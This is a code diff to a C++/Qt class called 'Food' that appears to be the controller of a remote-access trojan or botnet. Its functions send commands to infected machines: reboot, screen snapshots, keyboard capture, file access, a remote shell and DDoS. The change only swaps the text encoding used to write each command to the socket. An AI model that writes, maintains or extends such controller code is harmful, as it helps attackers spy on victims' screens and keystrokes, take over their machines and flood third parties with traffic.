@@ -30,7 +30,7 @@ void Food::sendCmdSendBox(QString &text)
     data.append(CmdSendBox+CmdSplit);
     data.append("TEXT"+CmdSplit+text);
     data.append(CmdEnd);
-    mSock->write(data.toLocal8Bit());
+    mSock->write(codec->fromUnicode(data));
 }
 
 void Food::sendCmdReboot()
@@ -38,7 +38,7 @@ void Food::sendCmdReboot()
     QString data;
     data.append(CmdReboot+CmdSplit);
     data.append(CmdEnd);
-    mSock->write(data.toLocal8Bit());
+    mSock->write(codec->fromUnicode(data));
 }
 
 void Food::sendCmdOffline()
@@ -46,7 +46,7 @@ void Food::sendCmdOffline()
     QString data;
     data.append(CmdOffline+CmdSplit);
     data.append(CmdEnd);
-    mSock->write(data.toLocal8Bit());
+    mSock->write(codec->fromUnicode(data));
 }
 
 void Food::sendCmdSnapshoot(int port)
@@ -55,7 +55,7 @@ void Food::sendCmdSnapshoot(int port)
     data.append(CmdSnapshoot+CmdSplit);
     data.append("PORT"+CmdSplit+QString::number(port));
     data.append(CmdEnd);
-    mSock->write(data.toLocal8Bit());
+    mSock->write(codec->fromUnicode(data));
 }
 
 void Food::sendCmdKeybd(int port)
@@ -64,7 +64,7 @@ void Food::sendCmdKeybd(int port)
     data.append(CmdKeybd+CmdSplit);
     data.append("PORT"+CmdSplit+QString::number(port));
     data.append(CmdEnd);
-    mSock->write(data.toLocal8Bit());
+    mSock->write(codec->fromUnicode(data));
 }
 
 void Food::sendCmdFile(int port)
@@ -73,7 +73,7 @@ void Food::sendCmdFile(int port)
     data.append(CmdFile+CmdSplit);
     data.append("PORT"+CmdSplit+QString::number(port));
     data.append(CmdEnd);
-    mSock->write(data.toLocal8Bit());
+    mSock->write(codec->fromUnicode(data));
 }
 
 void Food::sendCmdShell(int port)
@@ -82,7 +82,7 @@ void Food::sendCmdShell(int port)
     data.append(CmdShell+CmdSplit);
     data.append("PORT"+CmdSplit+QString::number(port));
     data.append(CmdEnd);
-    mSock->write(data.toLocal8Bit());
+    mSock->write(codec->fromUnicode(data));
 }
 
 void Food::sendCmdDdos(int port)
@@ -91,7 +91,7 @@ void Food::sendCmdDdos(int port)
     data.append(CmdDdos+CmdSplit);
     data.append("PORT"+CmdSplit+QString::number(port));
     data.append(CmdEnd);
-    mSock->write(data.toLocal8Bit());
+    mSock->write(codec->fromUnicode(data));
 }
 
 void Food::processCommand(QByteArray &cmd, QByteArray &args)
